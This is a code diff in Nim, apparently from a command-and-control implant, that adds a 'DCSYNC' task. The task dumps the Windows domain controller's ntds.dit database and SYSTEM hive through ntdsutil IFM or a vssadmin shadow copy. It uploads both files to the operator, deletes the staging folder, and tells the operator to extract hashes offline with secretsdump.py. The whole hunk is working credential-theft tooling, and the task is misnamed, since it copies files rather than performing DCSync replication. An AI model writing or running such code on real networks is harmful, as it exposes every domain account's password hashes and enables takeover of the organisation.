@@ -2270,6 +2270,52 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
     else:
       t.sendResult(id, "", "NTDS_DUMP: not supported on Linux")
 
+  of "DCSYNC":
+    # Extract ntds.dit + SYSTEM hive via IFM (default) or VSS; upload both for offline parsing.
+    # Args JSON: {"mode":"ifm|vss","out":"C:\\Users\\Public\\dcsync_out"}
+    # Offline: secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+    when defined(windows):
+      try:
+        let j       = try: parseJson(args) except: newJObject()
+        let mode    = j{"mode"}.getStr("ifm")
+        let tmpDir  = j{"out"}.getStr(r"C:\Users\Public\dcsync_out")
+        var dcErr   = ""
+        var ntdsPath = tmpDir & r"\Active Directory\ntds.dit"
+        var sysPath  = tmpDir & r"\registry\SYSTEM"
+
+        if mode == "vss":
+          let vssOut = runShell("vssadmin create shadow /for=C: 2>&1")
+          var shadowPath = ""
+          for line in vssOut.splitLines():
+            if "HarddiskVolumeShadowCopy" in line and r"\\?\" in line:
+              for tok in line.splitWhitespace():
+                if r"\\?\" in tok: shadowPath = tok.strip(chars = {'\r','\n'}); break
+          if shadowPath == "":
+            dcErr = "VSS shadow copy failed"
+          else:
+            discard runShell("mkdir \"" & tmpDir & "\" 2>&1")
+            discard runShell("copy \"" & shadowPath & "\\Windows\\NTDS\\ntds.dit\" \"" & tmpDir & "\\ntds.dit\" /Y 2>&1")
+            discard runShell("copy \"" & shadowPath & "\\Windows\\System32\\config\\SYSTEM\" \"" & tmpDir & "\\SYSTEM\" /Y 2>&1")
+            ntdsPath = tmpDir & "\\ntds.dit"
+            sysPath  = tmpDir & "\\SYSTEM"
+        else:
+          discard runShell("rmdir /S /Q \"" & tmpDir & "\" 2>&1")
+          discard runShell("ntdsutil \"ac i ntds\" \"ifm\" \"create full " & tmpDir & "\" q q 2>&1")
+
+        if dcErr == "":
+          for tup in [(ntdsPath, "ntds.dit"), (sysPath, "SYSTEM")]:
+            try:
+              let dat = readFile(tup[0])
+              t.uploadFile(id, tup[1], cast[seq[byte]](dat))
+            except: dcErr.add("read " & tup[0] & ": " & getCurrentExceptionMsg() & "; ")
+          discard runShell("rmdir /S /Q \"" & tmpDir & "\" 2>&1")
+          t.sendResult(id, "[+] DCSYNC: ntds.dit + SYSTEM uploaded. Run: secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL", dcErr)
+        else:
+          t.sendResult(id, "", dcErr)
+      except: t.sendResult(id, "", "dcsync: " & getCurrentExceptionMsg())
+    else:
+      t.sendResult(id, "", "DCSYNC: not supported on Linux")
+
   of "ADS_LIST", "ADS_READ", "ADS_WRITE", "ADS_DEL":
     when defined(windows):
       case typ.toUpperAscii()
